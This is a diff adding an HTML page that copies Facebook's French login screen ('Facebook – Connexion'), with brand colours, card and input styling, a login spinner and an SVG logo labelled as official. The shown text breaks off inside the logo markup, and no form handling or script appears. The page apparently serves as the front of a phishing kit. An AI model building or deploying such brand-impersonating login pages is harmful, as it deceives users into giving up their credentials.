@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Facebook – Connexion</title>
+<style>
+  :root {
+    --fb-blue: #1877f2;
+    --fb-blue-hover: #166fe5;
+    --fb-green: #42b72a;
+    --fb-green-hover: #36a420;
+    --bg: #f0f2f5;
+    --card: #ffffff;
+    --text: #1c1e21;
+    --muted: #606770;
+    --border: #dddfe2;
+    --input-bg: #f5f6f7;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; font-family:Helvetica,Arial,sans-serif; }
+  body {
+    background: var(--bg);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .fb-logo {
+    margin-bottom: 20px;
+    text-align: center;
+  }
+  .fb-logo svg {
+    width: 200px;
+    height: 70px;
+  }
+  .card {
+    background: var(--card);
+    width: 100%;
+    max-width: 396px;
+    padding: 18px 16px 24px;
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.04);
+    text-align: center;
+  }
+  .card-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 14px;
+    line-height: 1.34;
+  }
+  form { text-align: left; }
+  .field-group {
+    margin-bottom: 12px;
+  }
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    background: var(--input-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 15px;
+    color: var(--text);
+    transition: .2s;
+  }
+  input:focus {
+    outline: none;
+    border-color: var(--fb-blue);
+    background: var(--card);
+    box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+  }
+  input::placeholder { color: #8a8d91; }
+  .btn-fb {
+    width: 100%;
+    padding: 14px;
+    background: var(--fb-blue);
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .2s;
+  }
+  .btn-fb:hover {
+    background: var(--fb-blue-hover);
+  }
+  .btn-fb:active {
+    background: #1a6ed8;
+  }
+  .forgot-link {
+    display: block;
+    text-align: center;
+    margin: 14px 0 18px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--fb-blue);
+    text-decoration: none;
+  }
+  .forgot-link:hover { text-decoration: underline; }
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 10px 0 18px;
+  }
+  .btn-signup {
+    display: inline-block;
+    padding: 12px 24px;
+    background: var(--fb-green);
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    text-decoration: none;
+    transition: .2s;
+  }
+  .btn-signup:hover {
+    background: var(--fb-green-hover);
+  }
+  .footer-text {
+    text-align: center;
+    margin-top: 28px;
+    font-size: 13px;
+    color: #737373;
+  }
+  .footer-text a {
+    color: var(--text);
+    font-weight: 600;
+    text-decoration: none;
+  }
+  .footer-text a:hover { text-decoration: underline; }
+  .lang-bar {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 6px 12px;
+    margin-top: 24px;
+    max-width: 500px;
+    font-size: 12px;
+    color: #737373;
+  }
+  .lang-bar a {
+    color: #737373;
+    text-decoration: none;
+  }
+  .lang-bar a:hover { text-decoration: underline; }
+  .lang-bar .active { color: #737373; }
+  .footer-divider {
+    width: 100%;
+    height: 1px;
+    background: var(--border);
+    margin: 8px 0;
+  }
+  .copyright {
+    font-size: 11px;
+    color: #737373;
+    margin-top: 8px;
+  }
+  /* Spinner */
+  .spinner {
+    display: none;
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .6s linear infinite;
+    margin: 0 auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .btn-fb.loading .spinner { display: inline-block; }
+  .btn-fb.loading .btn-text { display: none; }
+</style>
+</head>
+<body>
+
+<div class="fb-logo">
+  <!-- Facebook logo SVG officiel -->
+  <svg viewBox="0 0 568 90" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 14.9C0 6.7 7.1 0 15.5 0H523C531.4 0 538 6.7 538 14.9V74.1C538 82.3 531.4 89 523 89H15.5C7.1 89 0 82.3 0 74.1V14.9Z" fill="#1877F2"/>
+    <path d="M223.5 28.7V39.5H209.8V50.3H223.5V72.5H236.4V50.3H250.1V39.5H236.4V28.7C236.4 24.8 239.3 22.4 243.5 22.4H250.1V11H241.5C231.7 11 223.5 17.3 223.5 28.7Z" fill="white"/>
+    <path d="M275.6 22.4C263.1 22.4 253.8 31.2 253.8 43.7C253.8 56.2 263.1 65 275.6 65C288.1 65 297.4 56.3 297.4 43.7C297.4 31.1 288.2 22.4 275.6 22.4ZM275.6 55.2C269 55.2 264.1 50.2 264.1 43.7C264.1 37.2 269 32.2 275.6 32.2C282.2 32.2 287.1 37.2 287.1 43.7C287.1 50.2 282.3 55.2 275.6 55.2Z" fill="white"/>
+    <path d="M341.2 22.4C334.9 22.4 329.7 25.8 326.5 30.6V23.7H314.4V72.5H327.1V52.3C327.1 45.6 330.5 40.5 337.2 40.5C343.1 40.5 346.5 44.3 346.5 50.5V72.5H359.2V48.5C359.2 35.8 352.9 22.4 341.2 22.4Z" fill="white"/>
+    <path d="M382.5 22.4C370 22.4 360.7 31.2 360.7 43.7C360.7 56.2 370 65 382.5 65C395 65 404.3 56.3 404.3 43.7C404.3 31.1 395.1 22.4 382.5 22.4ZM382.5 55.2C375.9 55.2 371 50.2 371 43.7C371 37.2 375.9 32.2 382.5 32.2C389.1 32.2 394 37.2 394 43.7C394 50.2 389.2 55.2 382.5 55.2Z" fill="white"/>
+    <path d="M443.6 22.4C437.3 22.4 432.1 25.8 428.9 30.6V23.7H416.8V72.5H429.5V52.3C429.5 45.6 432.9 40.5 439.6 40.5C445.5 40.5 448.9 44.3 448.9 50.5V72.5H461.6V48.5C461.6 35.8 455.3 22.4 443.6 22.4Z" fill="white"/>
+    <path d="M511.7 23.7H498.8V44.9C498.8 51.7 495.2 55.2 489.6 55.2C484.2 55.2 481.3 51.7 481
